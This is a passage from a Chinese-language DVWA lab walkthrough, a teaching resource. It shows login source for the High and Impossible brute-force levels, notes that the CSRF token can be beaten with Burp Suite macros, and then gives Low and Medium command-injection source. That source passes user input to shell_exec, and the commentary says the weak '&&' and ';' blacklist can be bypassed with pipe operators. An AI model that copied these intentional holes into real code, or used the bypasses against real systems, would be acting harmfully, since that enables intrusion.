	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Get users details</span>
		<span class="token variable">$row</span>    <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$avatar</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token comment">// Login successful</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;p&gt;Welcome to the password protected area <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$user</span><span class="token punctuation">}</span></span>&lt;/p&gt;"</span><span class="token punctuation">;</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;img src=\"<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$avatar</span><span class="token punctuation">}</span></span>\" /&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Login failed</span>
		<span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>这里主要增加了checkToken()函数，用于判断token是否正确，在访问页面前，会先生成一个token然后返回到客户端并hidden起来，请求的时候会带上token，因此，可以使用burpsuite的宏正则进行爆破，因为token是提前预知的。</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/9c/65/Q7dTD7tH_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/a0/13/7EQcmtxB_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="4Impossible_164"></a>4、Impossible</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Check Anti-CSRF token</span>
	<span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitise username input</span>
	<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'username'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$user</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$user</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitise password input</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'password'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$pass</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token variable">$pass</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Default values</span>
	<span class="token variable">$total_failed_login</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
	<span class="token variable">$lockout_time</span>       <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>
	<span class="token variable">$account_locked</span>     <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

	<span class="token comment">// Check the database (Check user information)</span>
	<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Check to see if the user has been locked out.</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'failed_login'</span> <span class="token punctuation">]</span> <span class="token operator">&gt;=</span> <span class="token variable">$total_failed_login</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// User locked out.  Note, using this method would allow for user enumeration!</span>
		<span class="token comment">//$html .= "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;";</span>

		<span class="token comment">// Calculate when the user would be allowed to login again</span>
		<span class="token variable">$last_login</span> <span class="token operator">=</span> <span class="token function">strtotime</span><span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'last_login'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$timeout</span>    <span class="token operator">=</span> <span class="token variable">$last_login</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token variable">$lockout_time</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$timenow</span>    <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">/*
		print "The last login was: " . date ("h:i:s", $last_login) . "&lt;br /&gt;";
		print "The timenow is: " . date ("h:i:s", $timenow) . "&lt;br /&gt;";
		print "The timeout is: " . date ("h:i:s", $timeout) . "&lt;br /&gt;";
		*/</span>

		<span class="token comment">// Check to see if enough time has passed, if it hasn't locked the account</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$timenow</span> <span class="token operator">&lt;</span> <span class="token variable">$timeout</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token variable">$account_locked</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
			<span class="token comment">// print "The account is locked&lt;br /&gt;";</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Check the database (if username matches the password)</span>
	<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':password'</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// If its a valid login...</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token variable">$account_locked</span> <span class="token operator">==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Get users details</span>
		<span class="token variable">$avatar</span>       <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'avatar'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$failed_login</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'failed_login'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$last_login</span>   <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'last_login'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token comment">// Login successful</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$user</span><span class="token punctuation">}</span></span>&lt;/em&gt;&lt;/p&gt;"</span><span class="token punctuation">;</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;img src=\"<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$avatar</span><span class="token punctuation">}</span></span>\" /&gt;"</span><span class="token punctuation">;</span>

		<span class="token comment">// Had the account been locked out since last login?</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$failed_login</span> <span class="token operator">&gt;=</span> <span class="token variable">$total_failed_login</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;"</span><span class="token punctuation">;</span>
			<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$failed_login</span><span class="token punctuation">}</span></span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;"</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Reset bad login count</span>
		<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Login failed</span>
		<span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Give the user some feedback</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$lockout_time</span><span class="token punctuation">}</span></span> minutes&lt;/em&gt;.&lt;/pre&gt;"</span><span class="token punctuation">;</span>

		<span class="token comment">// Update bad login count</span>
		<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Set the last login time</span>
	<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>Impossible级别主要是教如何防护，可以看到源代码中使用了prepare进行了PDO预编译来防止SQL注入，这样所有的数据都会被当成字符处理，同时对于暴力破解，用数据库中的fail_login和last_login字段，fail_login用于记录次数，last_login记录时间，一旦登录失败三次，将当前时间和最后登录时间对比，锁住十五秒。</p> 
</blockquote> 
<h2><a id="Command_Injection_274"></a>二、Command Injection</h2> 
<h3><a id="1Low_275"></a>1、Low</h3> 
<p><img src="https://images2.imgbox.com/05/bb/65K3lna7_o.png" alt="在这里插入图片描述"></p> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">// Determine OS and execute the ping command.</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Windows</span>
		<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// *nix</span>
		<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  -c 4 '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Feedback for the end user</span>
	<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$cmd</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<blockquote> 
 <p>先判断操作系统类别，然后使用shell_exec()函数执行target，类似函数还有exec()，passthru(),system()等，对target没进行任何限制，导致可以使用管道符拼接，多命令执行。</p> 
</blockquote> 
<h3><a id="2Medium_305"></a>2、Medium</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'ip'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">// Set blacklist</span>
	<span class="token variable">$substitutions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
		<span class="token string single-quoted-string">'&amp;&amp;'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
		<span class="token string single-quoted-string">';'</span>  <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
	<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Remove any of the charactars in the array (blacklist).</span>
	<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token function">array_keys</span><span class="token punctuation">(</span> <span class="token variable">$substitutions</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$substitutions</span><span class="token punctuation">,</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Determine OS and execute the ping command.</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">stristr</span><span class="token punctuation">(</span> <span class="token function">php_uname</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'s'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Windows NT'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Windows</span>
		<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// *nix</span>
		<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'ping  -c 4 '</span> <span class="token operator">.</span> <span class="token variable">$target</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Feedback for the end user</span>
	<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$cmd</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>黑名单过滤了;和&amp;&amp;，但是拼接命令不只有这些，还有|等，区别在于，&amp;&amp;要前一条命令执行成功才执行下一条，||则是上一条命令执行失败。<br> <img src="https://images2.imgbox.com/41/d7/UNnwxW6j_o.png" alt="在这里插入图片描述"></p> 
</blockquote> 
<h3><a id="3High_345"></a>3、High</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
